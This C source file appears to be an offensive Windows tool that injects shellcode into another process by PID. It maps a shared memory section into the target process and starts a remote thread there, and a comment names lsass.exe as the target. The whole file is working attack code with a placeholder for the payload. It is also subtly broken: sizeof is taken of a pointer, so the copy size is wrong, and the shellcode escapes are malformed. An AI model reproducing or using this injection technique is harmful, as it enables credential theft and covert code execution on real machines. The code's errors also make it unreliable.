#include "NTAPIs.h"

HANDLE injectShellcode(DWORD pid, char * shellcode)
{
	// Get size of shellcode
	size_t dSize = sizeof(shellcode);

	// Init variables
	SIZE_T size = dSize;
	LARGE_INTEGER sectionSize = { size };
	HANDLE sectionHandle = NULL;
	PVOID localSectionAddress = NULL, remoteSectionAddress = NULL;

	// Init NT APIs
	if (!InitializeNTAPIs())
		return NULL;

	// Create a memory section
	fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	// Create a view of the memory section in the local process
	fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE);

	// Get handle on pid
	HANDLE targetHandle = MyNtOpenProcess(PROCESS_ALL_ACCESS, pid);
	if (targetHandle != NULL)
		printf("[+] Got handle\n");
	else
	{
		printf("[-] Could not get handle\n");
		return NULL;
	}

	// create a view of the memory section in the target process
	fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ);

	// Copy shellcode to the local view, which will get reflected in the target process's mapped view
	memcpy(localSectionAddress, shellcode, sizeof(shellcode));
	printf("[+] Copied to local view\n");

	// Attempting to create remote thread on lsass.exe in order to trigger the shellcode
	HANDLE targetThreadHandle = NULL;
	fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL);
	if (targetThreadHandle != NULL)
		printf("[+] Remote thread started successfully!\n");

	// Cleanup
	CloseHandle(targetHandle);

	return targetThreadHandle;
}

// Put your shellcode here
char shellcode[] = "/xfc/xff.......";

int main(int argc, char ** argv)
{
    // PID to inject to
	DWORD pid = atoi(argv[1]);
	injectShellcode(pid, shellcode);
	return 0;
}